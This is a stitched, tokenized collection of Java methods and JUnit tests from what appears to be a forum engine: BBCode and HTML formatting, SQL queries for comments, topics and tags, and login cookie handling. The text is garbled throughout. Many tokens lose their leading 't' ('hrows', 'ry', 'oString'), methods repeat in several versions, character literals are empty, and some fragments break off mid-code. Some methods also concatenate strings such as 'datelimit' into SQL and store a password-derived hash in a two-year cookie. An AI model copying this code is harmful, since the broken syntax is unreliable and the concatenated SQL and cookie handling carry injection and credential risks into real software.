public String preparePostText ( Connection db , String exto ) hrows SQLException { exto = HTMLFormatter . htmlSpecialChars ( exto ) ; return process ( db , exto ) . oString ( ) ; } 
public int compare ( BBChunk o1 , BBChunk o2 ) { return ( o1 . start - o2 . start ) ; } 
public void estList ( ) hrows BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , LIST_TEST ) ; assertEquals ( LIST_RESULT , result ) ; } 
public void estBadList ( ) hrows BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , BADLIST_TEST ) ; assertEquals ( BADLIST_RESULT , result ) ; } 
public boolean matchPassword ( String password ) { return password . equals ( his . password ) ; } 
public static User getUser ( Connection con , String name ) hrows SQLException , UserNotFoundException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; User user = new User ( con , name ) ; String shortCacheId = " User?id= " + user . id ; String cacheId = MemCachedSettings . getId ( shortCacheId ) ; mcc . set ( cacheId , user , new Date ( new Date ( ) . getTime ( ) + CACHE_MILLIS ) ) ; return user ; } 
public boolean isAnonymousScore ( ) { return anonymous | | blocked | | score < ANONYMOUS_LEVEL_SCORE ; } 
private void performLogin ( HttpServletResponse response , Connection db , Template mpl , HttpSession session , String nick , User user ) hrows SQLException { session . putValue ( " login " , Boolean . TRUE ) ; session . putValue ( " nick " , nick ) ; session . putValue ( " moderator " , user . canModerate ( ) ) ; createCookies ( response , mpl , session , nick , user ) ; User . updateUserLastlogin ( db , nick , new Date ( ) ) ; } 
private void createCookies ( HttpServletResponse response , Template mpl , HttpSession session , String nick , User user ) { Cookie cookie = new Cookie ( " password " , user . getMD5 ( mpl . getSecret ( ) ) ) ; cookie . setMaxAge ( 60 * 60 * 24 * 31 * 24 ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; Cookie prof = new Cookie ( " profile " , nick ) ; prof . setMaxAge ( 60 * 60 * 24 * 31 * 12 ) ; prof . setPath ( " / " ) ; response . addCookie ( prof ) ; user . acegiSecurityHack ( response , session ) ; } 
public void checkBlocked ( ) hrows AccessViolationException { if ( blocked ) { hrow new AccessViolationException ( " Blocked user " ) ; } if ( ! activated ) { hrow new AccessViolationException ( " Not activated user " ) ; } if ( anonymous ) { hrow new AccessViolationException ( " Anonymous user - disabled " ) ; 
public void estURLHighlight5 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT9 ) ; formatter . enableUrlHighLightMode ( ) ; assertEquals ( formatter . process ( ) , RESULT9 ) ; } 
public static DateFormat createDefault ( ) { return DateFormat . getDateTimeInstance ( DateFormat . MEDIUM , DateFormat . MEDIUM , RUSSIAN_LOCALE ) ; } 
public static DateFormat createRFC822 ( ) { return new SimpleDateFormat ( " EEE, d MMM yyyy HH:mm:ss Z " , Locale . US ) ; } 
public static String showComments ( Connection db , User user , int offset , int limit ) hrows SQLException { DateFormat dateFormat = DateFormats . createDefault ( ) ; StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; ry { if ( limit < 1 | | offset < 0 ) { pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " opics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT 50 " ) ; } else { pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " opics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT " + limit + " OFFSET " + offset ) ; } pst . setString ( 1 , user . getNick ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " opicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " itle " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . oString ( ) ; } 
public void updateMessageText ( Connection db ) hrows SQLException { PreparedStatement pst = db . prepareStatement ( " UPDATE msgbase SET message=? WHERE id=? " ) ; pst . setString ( 1 , message ) ; pst . setInt ( 2 , msgid ) ; pst . executeUpdate ( ) ; } 
public static String oString ( List < String > ags ) { if ( ags = = null | | ags . isEmpty ( ) ) { return " " ; } String str = " " ; for ( String ag : ags ) { str + = ( str . length ( ) > 0 ? " , " : " " ) + ag ; } return str ; } 
public static List < String > getMessageTags ( Connection con , int msgid ) hrows SQLException { return new Tags ( con , msgid ) . ags ; } 
public static boolean updateTags ( Connection con , int msgid , List < String > agList ) hrows SQLException { List < String > oldTags = getMessageTags ( con , msgid ) ; PreparedStatement insertStatement = con . prepareStatement ( " INSERT INTO tags VALUES(?,?) " ) ; PreparedStatement deleteStatement = con . prepareStatement ( " DELETE FROM tags WHERE msgid=? and tagid=? " ) ; insertStatement . setInt ( 1 , msgid ) ; deleteStatement . setInt ( 1 , msgid ) ; boolean modified = false ; for ( String ag : agList ) { if ( ! oldTags . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; insertStatement . setInt ( 2 , id ) ; insertStatement . executeUpdate ( ) ; modified = rue ; } } for ( String ag : oldTags ) { if ( ! agList . contains ( ag ) ) { int id = getOrCreateTag ( con , ag ) ; deleteStatement . setInt ( 2 , id ) ; deleteStatement . executeUpdate ( ) ; modified = rue ; } } insertStatement . close ( ) ; deleteStatement . close ( ) ; return modified ; } 
public static String getTagLinks ( Connection con , int msgid ) hrows SQLException { Tags ags = new Tags ( con , msgid ) ; return getTagLinks ( ags ) ; } 
protected ModelAndView handleRequestInternal ( HttpServletRequest request , HttpServletResponse response ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } int msgid = new ServletParameterParser ( request ) . getInt ( " msgid " ) ; Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public static String showReplies ( Connection db , User user , int offset , int limit ) throws SQLException { DateFormat dateFormat = DateFormats . createDefault ( ) ; if ( offset < 0 ) offset = 0 ; if ( limit < 1 ) limit = 50 ; StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( " SELECT sections.name AS ptitle, groups.title AS gtitle, " + " topics.title, topics.id AS topicid, comments.id AS msgid, " + " comments.postdate, users.nick AS author " + " FROM sections, groups, topics, comments, comments AS parents, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND parents.userid = ? " + " AND comments.userid = users.id " + " AND comments.replyto = parents.id " + " AND NOT comments.deleted ORDER BY postdate DESC LIMIT " + limit + " OFFSET " + offset ) ; pst . setInt ( 1 , user . getId ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " opicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " itle " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " author " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . oString ( ) ; } 
public static String showReplies ( Connection db , User user , int offset , int limit ) throws SQLException { DateFormat dateFormat = DateFormats . createDefault ( ) ; if ( offset < 0 ) { offset = 0 ; } if ( limit < 1 ) { limit = 50 ; } StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; try { pst = db . prepareStatement ( " SELECT sections.name AS ptitle, groups.title AS gtitle, " + " topics.title, topics.id AS topicid, comments.id AS msgid, " + " comments.postdate, users.nick AS author " + " FROM sections, groups, topics, comments, comments AS parents, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND parents.userid = ? " + " AND comments.userid = users.id " + " AND comments.replyto = parents.id " + " AND NOT comments.deleted ORDER BY postdate DESC LIMIT " + limit + " OFFSET " + offset ) ; pst . setInt ( 1 , user . getId ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " opicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " itle " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " author " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . oString ( ) ; } 
public static String getTopicRss ( Connection db , String htmlPath , String fullUrl , Message opic ) hrows SQLException , BadSectionException { StringBuilder buf = new StringBuilder ( ) ; int sectionid = opic . getSectionId ( ) ; boolean vote = opic . isVotePoll ( ) ; String subj = opic . getTitle ( ) ; String url = opic . getUrl ( ) ; String linktext = opic . getLinktext ( ) ; Section section = new Section ( db , sectionid ) ; '); buf.append(HTMLFormatter.htmlSpecialChars(poll.renderPoll(db, fullUrl))).append('' + " "); } catch (PollNotFoundException e) { TODO write to log } } } else { buf.append("<description>").append(HTMLFormatter.htmlSpecialChars(topic.getProcessedMessage(db))); } buf.append("</description>"); return buf.toString(); } 
public void estEntityCrash ( ) { HTMLFormatter formatter = new HTMLFormatter ( GUARANTEED_CRASH ) ; formatter . enablePreformatMode ( ) ; formatter . enableUrlHighLightMode ( ) ; ry { BANG!!!! 
public void estURLHighlight ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT1 ) ; formatter . enableUrlHighLightMode ( ) ; assertEquals ( RESULT1 , formatter . process ( ) ) ; } 
public void estURLHighlight2 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT2 ) ; formatter . enableUrlHighLightMode ( ) ; assertEquals ( RESULT2 , formatter . process ( ) ) ; } 
public void estURLHighlight3 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT3 ) ; formatter . enableUrlHighLightMode ( ) ; formatter . setMaxLength ( 20 ) ; assertEquals ( RESULT3 , formatter . process ( ) ) ; } 
public void estURLHighlight4 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT8 ) ; formatter . enableUrlHighLightMode ( ) ; formatter . setMaxLength ( 20 ) ; assertEquals ( RESULT8 , formatter . process ( ) ) ; } 
public void estURLHighlight5 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT9 ) ; formatter . enableUrlHighLightMode ( ) ; assertEquals ( RESULT9 , formatter . process ( ) ) ; } 
public void estEntityCrash ( ) { HTMLFormatter formatter = new HTMLFormatter ( GUARANTEED_CRASH ) ; formatter . enablePreformatMode ( ) ; formatter . enableUrlHighLightMode ( ) ; ry { String r = formatter . process ( ) ; 
public void estUndescore ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_UNDERSCORE ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; Assert . assertTrue ( " Whole text must be formatted as link " , s . endsWith ( " > " ) ) ; } 
public void estUndescore ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_UNDERSCORE ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; Assert . assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " > " ) ) ; } 
public void estWithParamOnly ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_PARAM_ONLY ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; Assert . assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " > " ) ) ; } 
public void estWithCyrillic ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_CYR ) ; formatter . enableUrlHighLightMode ( ) ; formatter . enablePreformatMode ( ) ; String s = formatter . process ( ) ; Assert . assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " > " ) ) ; } 
static String nl2br ( String ext , boolean quoting ) { if ( ! quoting ) { ext = ext . replaceAll ( nlRE . pattern ( ) , " <br> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } if ( ext . charAt ( i ) = = '' ) { buf . append ( " <br> " ) ; } } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . oString ( ) ; } 
static String exnl2br ( String ext , boolean quoting ) { if ( ! quoting ) { ext = ext . replaceAll ( exnlRE . pattern ( ) , " <p> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( i ! = 0 ) { buf . append ( " <p> " ) ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } } else { cr = rue ; } } else { cr = false ; } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . oString ( ) ; } 
public static String htmlSpecialChars ( String str ) { StringBuffer res = new StringBuffer ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : Matcher m = uniRE . matcher ( str . substring ( i ) ) ; if ( m . find ( ) ) { String s = m . group ( ) ; res . append ( s ) ; i + = s . length ( ) - 1 ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . oString ( ) ; } 
public void estWithCyrillic ( ) { HTMLFormatter formatter = new HTMLFormatter ( RFC1738 ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; Assert . assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " > " ) ) ; } 
public void estNlSubstition ( ) { String s = HTMLFormatter . nl2br ( " This is a line nwith break inside it " ) ; Integer i = s . indexOf ( " <br> " ) ; Assert . assertThat ( " Newline is changed to <br> " , i , CoreMatchers . not ( - 1 ) ) ; } 
public void estStringEscape ( ) { String str = " This is an entity &#1999; " ; String s = HTMLFormatter . htmlSpecialChars ( str ) ; Assert . assertThat ( " String should remaint unescaped " , s , CoreMatchers . equalTo ( str ) ) ; } 
public void estAmpEscape ( ) { String str = " a&b " ; String s = HTMLFormatter . htmlSpecialChars ( str ) ; Assert . assertThat ( " Ampersand should be escaped " , s , CoreMatchers . equalTo ( " a&amp;b " ) ) ; } 
public void estParaSubstition ( ) { String str = " his is a line r rwith some nlinebreaks in it " ; String s = HTMLFormatter . exnl2br ( str , false ) ; Integer i = s . indexOf ( " <p> " ) ; Assert . assertThat ( " Newlines is changed to <p> " , i , CoreMatchers . not ( - 1 ) ) ; Integer b = s . indexOf ( " <p> " , i + 3 ) ; Assert . assertThat ( " Wait, there should be two paras " , b , CoreMatchers . not ( - 1 ) ) ; } 
static String nl2br ( String ext , boolean quoting ) { if ( ! quoting ) { return ext . replaceAll ( nlRE . pattern ( ) , " <br> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } if ( ext . charAt ( i ) = = '' ) { buf . append ( " <br> " ) ; } } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . oString ( ) ; } 
static String exnl2br ( String ext , boolean quoting ) { if ( ! quoting ) { return ext . replaceAll ( exnlRE . pattern ( ) , " <p> " ) ; } StringBuffer buf = new StringBuffer ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( i ! = 0 ) { buf . append ( " <p> " ) ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } } else { cr = rue ; } } else { cr = false ; } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . oString ( ) ; } 
public void estNoQuiting ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( QUOTING1 ) ; formatter . enableTexNewLineMode ( ) ; assertEquals ( RESULT_QUOTING1_NOQUOTING , formatter . process ( ) ) ; } 
public String process ( ) { StringTokenizer st = new StringTokenizer ( htmlSpecialChars ( ext ) , delim , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . oString ( ) ; if ( NewLine ) { res = nl2br ( res , quoting ) ; } if ( exNewLine ) { res = exnl2br ( res , quoting ) ; } if ( Preformat ) { res = " <pre> " + res + " </pre> " ; } return res ; } 
private static String URLEncoder ( String str ) { ry { StringBuilder buf = new StringBuilder ( ) ; 
private static String nl2br ( String ext , boolean quoting ) { if ( ! quoting ) { return ext . replaceAll ( nlRE . pattern ( ) , " <br> " ) ; } StringBuilder buf = new StringBuilder ( ) ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } if ( ext . charAt ( i ) = = '' ) { buf . append ( " <br> " ) ; } } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . oString ( ) ; } 
static String exnl2br ( String ext , boolean quoting ) { if ( ! quoting ) { return ext . replaceAll ( exnlRE . pattern ( ) , " <p> " ) ; } StringBuilder buf = new StringBuilder ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( i ! = 0 ) { buf . append ( " <p> " ) ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } } else { cr = rue ; } } else { cr = false ; } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . oString ( ) ; } 
public static String htmlSpecialChars ( String str ) { StringBuilder res = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : Matcher m = uniRE . matcher ( str . substring ( i ) ) ; if ( m . find ( ) ) { String s = m . group ( ) ; res . append ( s ) ; i + = s . length ( ) - 1 ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . oString ( ) ; } 
private static String wrapLongLine ( String line , int maxlength , String delim , int start ) { StringBuilder sb = new StringBuilder ( ) ; int index = start ; for ( Iterator i = new SGMLStringIterator ( line ) ; i . hasNext ( ) ; ) { String ch = ( String ) i . next ( ) ; if ( index % maxlength = = maxlength - 1 ) { sb . append ( delim ) ; } sb . append ( ch ) ; index + + ; } return sb . oString ( ) ; } 
public static String wrapLongLines ( String ext , int maxlength ) { StringTokenizer st = new StringTokenizer ( ext , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( wrapLongLine ( st . nextToken ( ) , maxlength , " " ) ) ; } return sb . oString ( ) ; } 
static String nl2br ( String ext , boolean quoting ) { if ( ! quoting ) { return ext . replaceAll ( nlRE . pattern ( ) , " <br> " ) ; } StringBuilder buf = new StringBuilder ( ) ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } if ( ext . charAt ( i ) = = '' ) { buf . append ( " <br> " ) ; } } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . oString ( ) ; } 
public void estCyrillicLink ( ) { HTMLFormatter formatter = new HTMLFormatter ( CYR_LINK ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; Assert . assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void estCyrillicLink ( ) { HTMLFormatter formatter = new HTMLFormatter ( CYR_LINK ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; System . out . println ( s ) ; Assert . assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public void estGoogleCache ( ) { HTMLFormatter formatter = new HTMLFormatter ( GOOGLE_CACHE ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; Assert . assertTrue ( " All text should be inside link " , s . endsWith ( " </a> " ) ) ; } 
public String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException { StringBuilder buf = new StringBuilder ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( ag ! = null & & ! " " . equals ( ag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , ag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int agid = rs . getInt ( " id " ) ; if ( agid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( agid ) . append ( ')' ) ; } } else { hrow new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " opics.url, topics.linktext, imagepost, vote, sections.name as pname " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, bbcode, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where + ' ' + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . oString ( ) ; } 
public String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException { StringBuilder buf = new StringBuilder ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( ag ! = null & & ! " " . equals ( ag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , ag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int agid = rs . getInt ( " id " ) ; if ( agid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( agid ) . append ( ')' ) ; } } else { hrow new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " opics.url, topics.linktext, imagepost, vote, sections.name as pname, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, bbcode, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where + ' ' + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . oString ( ) ; } 
public String process ( ) { StringTokenizer st = new StringTokenizer ( htmlSpecialChars ( ext ) , delim , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . oString ( ) ; if ( NewLine ) { res = nl2br ( res , quoting ) ; } if ( exNewLine ) { res = exnl2br ( res , quoting ) ; } if ( preformat ) { res = " <pre> " + res + " </pre> " ; } return res ; } 
public void enablePreformatMode ( ) { preformat = rue ; nl = " " ; delim = " " ; } 
public void estUndescore ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_UNDERSCORE ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " > " ) ) ; } 
public void estWithParamOnly ( ) { HTMLFormatter formatter = new HTMLFormatter ( LINK_WITH_PARAM_ONLY ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " > " ) ) ; } 
public void estWithCyrillic ( ) { HTMLFormatter formatter = new HTMLFormatter ( RFC1738 ) ; formatter . enableUrlHighLightMode ( ) ; String s = formatter . process ( ) ; assertTrue ( " Whole text must be formatted as link: " + s , s . endsWith ( " > " ) ) ; } 
public void estNlSubstition ( ) { String s = HTMLFormatter . nl2br ( " This is a line nwith break inside it " ) ; Integer i = s . indexOf ( " <br> " ) ; assertThat ( " Newline is changed to <br> " , i , CoreMatchers . not ( - 1 ) ) ; } 
public void estStringEscape ( ) { String str = " This is an entity &#1999; " ; String s = HTMLFormatter . htmlSpecialChars ( str ) ; assertThat ( " String should remaint unescaped " , s , CoreMatchers . equalTo ( str ) ) ; } 
public void estAmpEscape ( ) { String str = " a&b " ; String s = HTMLFormatter . htmlSpecialChars ( str ) ; assertThat ( " Ampersand should be escaped " , s , CoreMatchers . equalTo ( " a&amp;b " ) ) ; } 
public void estParaSubstition ( ) { String str = " his is a line r rwith some nlinebreaks in it " ; String s = HTMLFormatter . exnl2br ( str , false ) ; Integer i = s . indexOf ( " <p> " ) ; assertThat ( " Newlines is changed to <p> " , i , CoreMatchers . not ( - 1 ) ) ; Integer b = s . indexOf ( " <p> " , i + 3 ) ; assertThat ( " Wait, there should be two paras " , b , CoreMatchers . not ( - 1 ) ) ; } 
